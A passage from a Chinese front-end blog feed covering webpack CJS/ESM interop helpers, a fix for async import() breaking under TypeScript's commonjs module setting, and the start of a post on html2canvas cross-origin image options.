src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405081609627.png" alt=""></p><p>这是因为 <code>__webpack_require__.hmd</code> 对 <code>module</code> 对象进行了一层包裹，让 module 在执行 set 时产生报错，后续往 <code>module.exports</code> 上赋值自然就会报错了，模块无法执行，<code>__webpack_require__.hmd</code> 的实现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* webpack/runtime/harmony module decorator */</span></span><br><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  __webpack_require__.<span class="property">hmd</span> = <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">module</span> = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="variable language_">module</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">module</span>.<span class="property">children</span>) <span class="variable language_">module</span>.<span class="property">children</span> = [];</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">module</span>, <span class="string">&#x27;exports&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">set</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(</span><br><span class="line">          <span class="string">&#x27;ES Modules may not assign module.exports or exports.*, Use ESM export syntax, instead: &#x27;</span> +</span><br><span class="line">            <span class="variable language_">module</span>.<span class="property">id</span>,</span><br><span class="line">        );</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">module</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>由此可见，在 CJS 中是无法使用 <code>import</code> 语法的，同样的使用 <code>export</code> 也会报错。</p><h2 id="ESM-中使用-import-引入"><a href="#ESM-中使用-import-引入" class="headerlink" title="ESM 中使用 import 引入"></a>ESM 中使用 import 引入</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cjsDefault <span class="keyword">from</span> <span class="string">&#x27;./utils/cjs.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> addResult = cjsDefault.<span class="title function_">add</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  <span class="string">&#x27;App ready!&#x27;</span>,</span><br><span class="line">  addResult,</span><br><span class="line">  cjsDefault.<span class="property">CJS_CONSTANCE</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>编译为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* harmony import */</span> <span class="keyword">var</span> _utils_cjs_js__WEBPACK_IMPORTED_MODULE_1__ =</span><br><span class="line">  <span class="title function_">__webpack_require__</span>(<span class="number">834</span>);</span><br><span class="line"><span class="comment">/* harmony import */</span> <span class="keyword">var</span> _utils_cjs_js__WEBPACK_IMPORTED_MODULE_1___default =</span><br><span class="line">  <span class="comment">/*#__PURE__*/</span> __webpack_require__.<span class="title function_">n</span>(</span><br><span class="line">    _utils_cjs_js__WEBPACK_IMPORTED_MODULE_1__,</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> addResult = <span class="title function_">_utils_cjs_js__WEBPACK_IMPORTED_MODULE_1___default</span>().<span class="title function_">add</span>(</span><br><span class="line">  <span class="number">1</span>,</span><br><span class="line">  <span class="number">2</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  <span class="string">&#x27;App ready!&#x27;</span>,</span><br><span class="line">  addResult,</span><br><span class="line">  <span class="title function_">_utils_cjs_js__WEBPACK_IMPORTED_MODULE_1___default</span>().<span class="property">CJS_CONSTANCE</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">(<span class="number">0</span>, _utils__WEBPACK_IMPORTED_MODULE_2__ <span class="comment">/* [&quot;default&quot;] */</span>.<span class="property">ZP</span>)();</span><br></pre></td></tr></table></figure><p>可以看到编译后的代码使用 <code>__webpack_require__.n</code> 来包裹 CJS 模块的产出，这是因为 CJS 是没有默认导出，而该方法就是将一个 CJS 模块添加默认导出，默认导出值即为 <code>module.exports</code> 出的对象，用于兼容在 ESM 场景下的使用，具体实现如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* webpack/runtime/compat get default export */</span></span><br><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// getDefaultExport function for compatibility with non-harmony modules</span></span><br><span class="line">  __webpack_require__.<span class="property">n</span> = <span class="keyword">function</span> (<span class="params"><span class="variable language_">module</span></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> getter =</span><br><span class="line">  <span class="comment">// 如果是 esm 模块的话，就导出模块的 default 对象</span></span><br><span class="line">      <span class="variable language_">module</span> &amp;&amp; <span class="variable language_">module</span>.<span class="property">__esModule</span></span><br><span class="line">        ? <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">module</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">// 否则就导出整个 module 对象</span></span><br><span class="line">        : <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">module</span>;</span><br><span class="line">          &#125;;</span><br><span class="line">    __webpack_require__.<span class="title function_">d</span>(getter, &#123; <span class="attr">a</span>: getter &#125;);</span><br><span class="line">    <span class="keyword">return</span> getter;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="ESM-中使用-require-引入"><a href="#ESM-中使用-require-引入" class="headerlink" title="ESM 中使用 require 引入"></a>ESM 中使用 require 引入</h2><p>在 ESM 模块中使用 require 是被允许的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; add, <span class="variable constant_">CJS_CONSTANCE</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./utils/cjs.js&#x27;</span>;</span><br></pre></td></tr></table></figure><p>会被转换为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; cloneDeep, <span class="variable constant_">ESM_CONSTANCE</span> &#125; = <span class="title function_">__webpack_require__</span>(<span class="number">624</span>);</span><br></pre></td></tr></table></figure><p>但需要注意的是，如果使用了 require 来引入 ESM 模块，及时模块中未使用的方法也是会被 <code>__webpack_require__.d</code> 注册导出的，这就会使模块失去 tree-shaking 的特性，因此谨慎使用 require 导入模块：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* harmony export */</span> __webpack_require__.<span class="title function_">d</span>(__webpack_exports__, &#123;</span><br><span class="line">  <span class="comment">/* harmony export */</span> <span class="attr">ESM_CONSTANCE</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* binding */</span> <span class="variable constant_">ESM_CONSTANCE</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/* harmony export */</span> <span class="attr">cloneDeep</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* binding */</span> cloneDeep;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/* harmony export */</span> <span class="attr">default</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* export default binding */</span> __WEBPACK_DEFAULT_EXPORT__;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/* harmony export */</span> <span class="attr">esmAdd</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* binding */</span> esmAdd;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/* harmony export */</span> <span class="attr">unusedFunc</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">/* binding */</span> unusedFunc;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">/* harmony export */</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此外，如果 ESM 中有 <code>export default</code> 的默认导出，转为 <code>require</code> 引入后会被挂载 <code>default</code> 属性下。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://zhuanlan.zhihu.com/p/508808789">https://zhuanlan.zhihu.com/p/508808789</a></li><li><a href="https://zhuanlan.zhihu.com/p/511058113">https://zhuanlan.zhihu.com/p/511058113</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次 Webpack Vue 项目的异步引入失效</title>
      <link href="/2024/04/3b3b66431fcb.html"/>
      <url>/2024/04/3b3b66431fcb.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-问题发现"><a href="#1-问题发现" class="headerlink" title="1. 问题发现"></a>1. 问题发现</h1><p>在回顾 <a href="https://github.com/EsunR/webpack-playground">webpack-playground</a> 这个项目的 Vue + TS 模板时，意外发项目中使用 <code>import</code> 异步引入模块时是失效的，代码正常被执行，但是并没有异步引入该方法，方法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">addCount</span> = (<span class="params">num: number</span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">import</span>(<span class="comment">/* webpackChunkName: &quot;lodash&quot; */</span> <span class="string">&#x27;lodash&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">&#123; <span class="keyword">default</span>: _ &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    count.<span class="property">value</span> = _.<span class="title function_">add</span>(count.<span class="property">value</span>, num);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是打包后，并没有将异步引入的 lodash 单独打成一个模块，构建出的代码也只有一个 <code>main.js</code> 文件：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240425215244.png" alt=""></p><p>同样的，异步引入的路由也不会被正常拆分成单独的模块，Element Plus 引入的组件也不会进行 tree shake。</p><h1 id="2-问题解决"><a href="#2-问题解决" class="headerlink" title="2. 问题解决"></a>2. 问题解决</h1><p>查看编译后的 <code>main.js</code> 发现了 lodash 整个文件都被打入了，找到异步 import 调用的位置，发现代码被编译为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">addCount</span> = num =&gt; &#123;</span><br><span class="line">  <span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title function_">__importStar</span>(<span class="title function_">__webpack_require__</span>( <span class="comment">/* webpackChunkName: &quot;lodash&quot; */</span><span class="number">378</span>))).<span class="title function_">then</span>(<span class="function"><span class="params">_ref</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">default</span>: _</span><br><span class="line">&#125; = _ref;</span><br><span class="line">count.<span class="property">value</span> = _.<span class="title function_">add</span>(count.<span class="property">value</span>, num);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;find it!!!!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而模块 <code>378</code> 正是被 webpack 打入的 lodash，位于 <code>main.js</code> 中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***/</span> <span class="number">378</span>:</span><br><span class="line"><span class="comment">/***/</span> (<span class="keyword">function</span>(<span class="params"><span class="variable language_">module</span>, <span class="built_in">exports</span>, __webpack_require__</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* module decorator */</span> <span class="variable language_">module</span> = __webpack_require__.<span class="title function_">nmd</span>(<span class="variable language_">module</span>);</span><br><span class="line"><span class="keyword">var</span> __WEBPACK_AMD_DEFINE_RESULT__;<span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span></span></span><br><span class="line"><span class="comment"> * Lodash &lt;https://lodash.com/&gt;</span></span><br><span class="line"><span class="comment"> * Copyright OpenJS Foundation and other contributors &lt;https://openjsf.org/&gt;</span></span><br><span class="line"><span class="comment"> * Released under MIT license &lt;https://lodash.com/license&gt;</span></span><br><span class="line"><span class="comment"> * Based on Underscore.js 1.8.3 &lt;http://underscorejs.org/LICENSE&gt;</span></span><br><span class="line"><span class="comment"> * Copyright Jeremy Ashkenas, DocumentCloud and Investigative Reporters &amp; Editors</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">;(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Used as a safe reference for `undefined` in pre-ES5 environments. */</span></span><br><span class="line">  <span class="keyword">var</span> <span class="literal">undefined</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Used as the semantic version number. */</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">VERSION</span> = <span class="string">&#x27;4.17.21&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Used as the size to enable large array optimizations. */</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">LARGE_ARRAY_SIZE</span> = <span class="number">200</span>;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br></pre></td></tr></table></figure><p>如果是使用了 import 的异步引入，webpack 是不会将其处理为 <code>Promise.resolve</code> 的，<strong>而是将其处理为 webpack 自己的异步引入方法</strong>，如下是一个生效的正常的异步引入代码被 webpack 打包后的结果（关闭混淆）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// i 是</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">addCount</span> = num =&gt; &#123;</span><br><span class="line">  __webpack_require__.<span class="title function_">e</span>(<span class="comment">/* import() | lodash */</span> <span class="number">202</span>).<span class="title function_">then</span>(__webpack_require__.<span class="property">t</span>.<span class="title function_">bind</span>(__webpack_require__, <span class="number">9378</span>, <span class="number">23</span>)).<span class="title function_">then</span>(<span class="function"><span class="params">_ref</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">default</span>: _</span><br><span class="line">&#125; = _ref;</span><br><span class="line">count.<span class="property">value</span> = _.<span class="title function_">add</span>(count.<span class="property">value</span>, num);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;find it!!!!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这就很奇怪了，为什么 webpack 没有将异步 import 的代码成功转换呢？</p><p>思考后想到由于这是一个 Typescript 项目，我们编写的 ts 代码是会先被 <code>ts-loader</code> 处理成 js，然后再交给 webpack 处理的，那会不会是这里出现了问题，而 <code>ts-loader</code> 使用的是 Typescript 官方编译器 tsc，因此我们在该项目的工作目录下使用 tsc 编译 ts 文件，就能调出来 <code>ts-loader</code> 处理后、webpack 处理前的 js 代码。</p><p>说干就干，这里我们简化一下，只将异步引入 lodash 的代码拿出来写到一个 ts 文件里进行编译。</p><p>编译前的 ts 代码：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">import</span>(<span class="string">&quot;lodash&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">_</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(_.<span class="title function_">camelCase</span>(<span class="string">&quot;Hello world&quot;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在当前项目中编译后的 ts 代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="keyword">return</span> <span class="built_in">require</span>(<span class="string">&quot;lodash&quot;</span>); &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">_</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(_.<span class="title function_">camelCase</span>(<span class="string">&quot;Hello world&quot;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>到这里基本上破案了，我写的异步 import 被 tsc 按照 commonjs 规范编译成了 require，webpack 自然就会将 lodash 按照按照同步代码的方式去打包了。</p><p>对比一下上面经过  webpack 处理后的代码，可以感受一下 webpack 拿到上面的代码的处理过程：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">resolve</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> <span class="title function_">__importStar</span>(<span class="title function_">__webpack_require__</span>( <span class="comment">/* webpackChunkName: &quot;lodash&quot; */</span><span class="number">378</span>))).<span class="title function_">then</span>(<span class="function"><span class="params">_ref</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">let</span> &#123;</span><br><span class="line">  <span class="attr">default</span>: _</span><br><span class="line">&#125; = _ref;</span><br><span class="line">count.<span class="property">value</span> = _.<span class="title function_">add</span>(count.<span class="property">value</span>, num);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>要想让 tsc 不讲代码转成 commonjs，我们需要修改 <code>tsconfig.json</code> 的配置，具体要动的配置项如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- &quot;module&quot;: &quot;commonjs&quot;,</span></span><br><span class="line"><span class="addition">+ &quot;module&quot;: &quot;ESNext&quot;,</span></span><br><span class="line"><span class="addition">+ &quot;moduleResolution&quot;: &quot;node10&quot;,</span></span><br><span class="line"><span class="addition">+ &quot;esModuleInterop&quot;: true,</span></span><br></pre></td></tr></table></figure><p>此外还要注意一点，如果你的 webpack 构建文件是用 ts 编写的，修改后执行 webpack 构建可能会报错，这是因为上面我们修改了 <code>tsconfig.json</code> 配置，所以会导致 <code>ts-node</code>（webpack 使用了 <code>ts-node</code> 来运行 webpack 的 Typescript 构建文件）使用 ESModule 去编译代码。但因为我们大多数编写的 webpack 配置文件都是按照 commonjs 规范写的（比如使用了 <code>__dirname</code>、<code>require</code> 语法），同时 webpack 一些相关的包都是 cjs 包，因此在 ESM 规范下必然会报错。</p><p>为了解决这一问题也很简单，<code>tsconfig.json</code> 中添加 <code>ts-node</code> 字段可以单独指定 <code>ts-node</code> 的运行配置，我们让 <code>ts-node</code> 还在 cjs 规范下运行即可：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;ts-node&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonJS&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;esModuleInterop&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ALL DONE 🎉</p><p><a href="https://github.com/EsunR/webpack-playground/commit/0c36c93d0ed56cf8f9ca8fd1ef13e14b026170f5">完整的代码修复参考</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> esm </tag>
            
            <tag> cjs </tag>
            
            <tag> webpack </tag>
            
            <tag> Vue </tag>
            
            <tag> 异步引入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html2canvas 图片跨域问题的解决方案及其原理</title>
      <link href="/2024/03/4ac0a05c2c2a.html"/>
      <url>/2024/03/4ac0a05c2c2a.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>html2canvas 是一个用于将 DOM 结构转为 canvas 对象的一个库，利用这个库就可以实现对页面的某一部分进行截图这样的功能。</p><p>但是由于其工作方式是将 DOM 结构进行解析后渲染在一个离屏 canvas 上，因此会受到一些限制。最常见的就是跨域资源无法被正常渲染，其根本原因是 canvas 调用跨域资源时受到 CORS 的保护，为了避免出现跨域资源的问题通常的解决方案是：</p><ol><li>将 html2canvas 的 <code>useCORS</code> 设置为 <code>true</code>；</li><li>受访问的服务器必须支持 CORS，也就是以跨域方式获取资源时要返回对应的跨域头；</li><li>为 img 标签添加 <code>crossorigin=&quot;anonymous&quot;</code> 属性；</li></ol><p>但是如果不搞清楚做的每一个行为具体做了什么事情，会发生什么，那么还是会出现各种各样的问题。</p><h1 id="2-html2canvas-的-allowTaint-与-useCORS"><a href="#2-html2canvas-的-allowTaint-与-useCORS" class="headerlink" title="2. html2canvas 的 allowTaint 与 useCORS"></a>2. html2canvas 的 allowTaint 与 useCORS</h1><p>解决方案的第一条『将 html2canvas 的 <code>useCORS</code> 设置为 <code>true</code>』，表示允许 canvas 中加载使用 CORS 加载跨域资源，那么 <code>useCORS</code> 具体做了什么事情？同时 <code>allowTaint</code> 选项也是允许画布被污染（也就是允许加载跨域资源），其与 <code>useCORS</code> 的开关又有什么关系？本章节主要对这两个问题进行讨论。</p><h3 id="开启-allowTaint-时具体发生了什么"><a href="#开启-allowTaint-时具体发生了什么" class="headerlink" title="开启 allowTaint 时具体发生了什么"></a>开启 allowTaint 时具体发生了什么</h3><p>我们先谈 <code>allowTaint</code>，这一选项表示是否允许画布被污染（也就是是否允许在画布中加载跨域资源），可能很多人都尝试开启 <code>allowTaint</code> 来加载跨域图片，但却只会得到一个报错，让我们来看看具体发生了什么。</p><p><code>allowTaint</code> 默认为 <code>false</code> 时，html2canvas 遇到跨域资源（如跨域图片、跨域画布）时会直接不将此元素绘制到画布上，避免 canvas 在调用 <code>toDataURL</code> 这类操作画布的 API 时报错，比如出现 <code>Tainted canvases may not be exported（受污染的画布不得导出）</code> 的错误。</p><p>反之，<code>alowTaint</code> 设置为 <code>true</code> 后，html2canvas 便会跳过检查跨域资源的这一过程，但如果画布确实被污染，调用 <code>toDataURL</code> 等这类操作画布的 API 时就会报错，并且 html2canvas 的 Promise 会走到 catch 阶段。</p><p>需要注意的是，对于图片资源只有在 <code>allowTaint</code> 设置为 <code>false</code> ，且没有使用 <code>useCORS</code> 或者 <code>proxy</code> 时，才会不将其绘制到画布上，具体的判断代码如下：</p><blockquote><p>这也就是 <code>allowTaint</code> 和 <code>useCORS</code> 的关系了</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">async</span> <span class="title function_">loadImage</span>(<span class="params">key: string</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> isSameOrigin = <span class="title class_">CacheStorage</span>.<span class="title function_">isSameOrigin</span>(key);</span><br><span class="line"><span class="keyword">const</span> useCORS =</span><br><span class="line">!<span class="title function_">isInlineImage</span>(key) &amp;&amp; <span class="variable language_">this</span>.<span class="property">_options</span>.<span class="property">useCORS</span> === <span class="literal">true</span> &amp;&amp; <span class="variable constant_">FEATURES</span>.<span class="property">SUPPORT_CORS_IMAGES</span> &amp;&amp; !isSameOrigin;</span><br><span class="line"><span class="keyword">const</span> useProxy =</span><br><span class="line">!<span class="title function_">isInlineImage</span>(key) &amp;&amp;</span><br><span class="line">!isSameOrigin &amp;&amp;</span><br><span class="line">!<span class="title function_">isBlobImage</span>(key) &amp;&amp;</span><br><span class="line"><span class="keyword">typeof</span> <span class="variable language_">this</span>.<span class="property">_options</span>.<span class="property">proxy</span> === <span class="string">&#x27;string&#x27;</span> &amp;&amp;</span><br><span class="line"><span class="variable constant_">FEATURES</span>.<span class="property">SUPPORT_CORS_XHR</span> &amp;&amp;</span><br><span class="line">!useCORS;</span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">!isSameOrigin &amp;&amp;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_options</span>.<span class="property">allowTaint</span> === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">!<span class="title function_">isInlineImage</span>(key) &amp;&amp;</span><br><span class="line">!<span class="title function_">isBlobImage</span>(key) &amp;&amp;</span><br><span class="line">!useProxy &amp;&amp;</span><br><span class="line">!useCORS</span><br><span class="line">) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="开启-useCORS-时具体发生了什么"><a href="#开启-useCORS-时具体发生了什么" class="headerlink" title="开启 useCORS 